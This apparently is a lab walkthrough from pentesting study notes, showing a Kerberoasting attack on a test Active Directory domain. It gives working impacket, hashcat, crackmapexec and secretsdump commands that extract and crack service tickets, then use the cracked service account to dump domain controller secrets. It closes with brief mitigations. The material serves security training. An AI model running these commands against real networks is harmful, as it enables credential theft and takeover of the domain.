# Kerberoasting

- Any authenticated domain user can request a TGS for any SPN.
- Service accounts often run critical services and are frequently over-privileged.
- Extract Kerberos Service Tickets (TGS) for accounts tied to Service Principal Names (SPNs), then brute-force the ticket offline to recover the service account’s password.
- If the service account password is weak, offline cracking is trivial.

## Walkthrough

1. Enumeration and Extraction

```
sudo impacket-GetUserSPNs MARVEL.local/fcastle:Password1! -dc-ip 10.0.2.18 -request -outputfile spns.hash
```

```{figure} ../../../_static/AD/kerberoasting1.png
:alt: Extracting SPNs
:width: 100%
:align: center

Extracting SPNs
```

2. Offline Cracking

Mode 13100 = Kerberos 5 TGS-REP etype 23.

```
hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt
```

```{figure} ../../../_static/AD/kerberoasting2.png
:alt: Cracking Service Password
:width: 100%
:align: center

Cracking Service Password
```

3. Privilege Escalation

- If successful, you get the service account password.
- Many service accounts are domain admins or have local admin rights across multiple machines, making this a strong lateral movement technique.

```
crackmapexec smb 10.0.2.0/24 -u SQLService -p 'MYpassword123#' -d MARVEL.local
impacket-secretsdump MARVEL.local/SQLService:'MYpassword123#'@10.0.2.XX
```

```{figure} ../../../_static/AD/kerberoasting3.png
:alt: Testing the credentials across the domain
:width: 100%
:align: center

Testing the credentials across the domain
```

Remember from our domain enumeration that this service account is misconfigured as Domain Admin. Therefore we can use it to dump secrets from any machine, including the DC.

```{figure} ../../../_static/AD/kerberoasting4.png
:alt: Dumping DC secrets
:width: 100%
:align: center

Dumping DC secrets
```

## Mitigations

- Strong Passwords
- Least privilege (Service account does not have to run as Domain Admin)
